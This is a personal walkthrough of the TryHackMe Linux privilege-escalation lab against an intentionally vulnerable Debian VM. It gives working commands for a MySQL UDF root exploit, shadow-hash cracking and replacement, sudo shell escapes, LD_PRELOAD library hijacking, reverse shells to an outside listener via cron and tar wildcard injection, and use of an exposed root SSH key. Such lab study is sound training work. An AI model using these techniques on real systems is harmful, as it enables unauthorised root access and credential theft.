#FreeRoom 
https://tryhackme.com/room/linuxprivesc

This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before trying to access the Debian VM!

SSH should be available on port 22. You can login to the "user" account using the following command:

```
ssh user@MACHINE_IP

password321
```

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. **Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!**

```
Run the "id" command. What is the result?

uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

```

## service exploits 

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

```
cd /home/user/tools/mysql-udf
ls
raptor_udf2.c

# compile the exploit
gcc -g -c raptor_udf2.c -fPIC  
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

ls
raptor_udf2.c  raptor_udf2.o  raptor_udf2.so

# Connect to the MySQL service as the root user with a blank password:
mysql -u root

# Execute the following commands on the MySQL shell to create a 
# User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;

create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

# Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

\q
Enter
```

run the `/tmp/rootbash` executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p

whoami
root

rm /tmp/rootbash
exit
```

## weak file permissions 

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the` /etc/shadow `file on the VM is world-readable:
```
ls -l /etc/shadow

cat /etc/shadow
```
Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip` /usr/share/wordlists/rockyou.txt.gz` first and run the command using sudo depending on your version of Kali:

```
cat /etc/shadow | grep root >> hash.txt

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

john --format=sha512crypt  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john --show hash.txt

password123
```

Generate a new password hash with a password of your choice:

```
ls -l /etc/shadow

mkpasswd -m sha-512 newpasswordhere

sudo nano /etc/shadow

# MUST KEEP :17298:0:99999:7::: AT THE END !

root:$6$yrVnTdV3KaUMi$/Mx.x1P2urEbFMg6X9BfFPOCs5162dY25QZ2yMC0PCRF.mw0UFepPgnBCjCtVMtqhsJxe70Qd7shiSoEukhOO.:17298:0:99999:7:::
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:
```
su root
newpasswordhere
```

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

```
Run the "id" command as the newroot user. What is the result?

uid=0(root) gid=0(root) groups=0(root)

```

## sudo shell escape sequence 

List the programs which sudo allows your user to run:

`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

```
sudo -l

(root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

How many programs is "user" allowed to run via sudo?

11

One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

apache2

Consider how you might use this program with sudo to gain root privileges without a shell escape sequence. (Play around with certain options the program has!)

#---- get root
sudo vim -c ':!/bin/bash'

sudo man man  
!/bin/bash

sudo awk 'BEGIN {system("/bin/bash")}'

sudo less /etc/profile  
!/bin/sh

sudo ftp  
!/bin/sh

```

## sudo: environment variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):
```
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
```

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at` /home/user/tools/sudo/preload.c`:

Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

Remember to exit out of the root shell before continuing!

```
sudo -l

ldd /usr/sbin/apache2

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

sudo LD_LIBRARY_PATH=/tmp apache2
```

## cron jobs: file permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:
There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:
Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?

```
cat /etc/crontab

locate overwrite.sh

ls -l /usr/local/bin/overwrite.sh

which vim
vim /usr/local/bin/overwrite.sh

#!/bin/bash  
bash -i >& /dev/tcp/<YOUR MACHINE IP>/4444 0>&1

# new tab
nc -nlvp 4444
```

## cron jobs: PATH variable

```
cat /etc/crontab

SHELL=/bin/sh
PATH=/home/user:

# Create a file called **overwrite.sh** in your home directory
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash

chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with -p to gain a shell running with root privileges:

```
/tmp/rootbash -p

rm /tmp/rootbash
exit

What is the value of the PATH variable in /etc/crontab?

/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

## cron jobs: wildcards 

```
cat /usr/local/bin/compress.sh

#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

chmod +x /home/user/shell.elf

touch /home/user/--checkpoint=1  
touch /home/user/--checkpoint-action=exec=shell.elf

nc -nlvp 4444

rm /home/user/shell.elf  
rm /home/user/--checkpoint=1  
rm /home/user/--checkpoint-action=exec=shell.elf

```

## task 16 : passwords & keys 

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

```
cat ~/.*history | less

mysql -h somehost.local -uroot -ppassword123

su root
```

```
ls /home/user

cat /home/user/myvpn.ovpn

auth-user-pass /etc/openvpn/auth.txt

cat /etc/openvpn/auth.txt

root
password123

su root
```

```
ls -la /

ls -l /.ssh

-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key

cd /.ssh
ls
cat root_key

copy & paste in root-key

chmod 600

ssh -i root-key root@

ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.101.10
```

## task 19: NFS 

```

no_root_squash
```

---
Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: **/home/user/tools/privesc-scripts** 

88 points

https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5

![[Pasted image 20250321110509.png]]

